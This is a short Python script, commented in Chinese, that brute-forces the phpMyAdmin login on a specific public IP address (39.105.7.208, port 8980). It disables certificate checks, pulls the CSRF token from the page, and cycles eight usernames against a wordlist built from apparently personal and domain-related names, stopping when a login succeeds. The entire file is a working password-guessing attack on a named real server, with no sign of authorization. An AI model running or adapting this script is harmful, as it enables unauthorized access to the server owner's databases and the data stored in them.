#!/usr/bin/env python3
"""39.105.7.208 phpMyAdmin爆破(带域名相关密码)"""
import urllib.request, http.cookiejar, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def try_login(user, pw):
    try:
        cj = http.cookiejar.CookieJar()
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
        op.addheaders = [("User-Agent","Mozilla/5.0")]
        base = "http://39.105.7.208:8980/phpmyadmin/"
        r = op.open(base, timeout=6)
        html = r.read().decode("utf-8","ignore")
        m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
        if not m: return None
        data = f"pma_username={user}&pma_password={pw}&server=1&token={m.group(1)}".encode()
        op.open(urllib.request.Request(base+"index.php", data=data), timeout=6).read()
        r = op.open(base+"index.php", timeout=6)
        body = r.read().decode("utf-8","ignore")
        if "Cannot log in" in body or "#1045" in body:
            return "FAIL"
        if "logout" in body or "navigation" in body or "server_databases" in body:
            return "SUCCESS"
        return "UNKNOWN"
    except Exception:
        return "ERR"

pwds = ["muying","muying1688","zhangying","zhangying1688","123456","root","admin","baby1688",
        "muying888","zhangying888","1688","zyt1688","zy1688","muying2010","muying2020",
        "muying2024","muying2026","zz1688","tang1688","tangzhang","tang","tang123",
        "12345678","admin123","muying123","baby123","zhang1688","ying1688","mysc",
        "zhangyue","zhangyuetang","zyt","muying1688.com","zhangyingtang","tangying"]

for u in ["root","muying","admin","zhangying","muying1688","zymy","tang","zhangyue"]:
    print(f"--- {u} ---", flush=True)
    for pw in pwds:
        r = try_login(u, pw)
        if r == "SUCCESS":
            print(f"!!! {u}/{pw} 登录成功!", flush=True)
            sys.exit(0)
        time.sleep(0.15)
print("DONE")
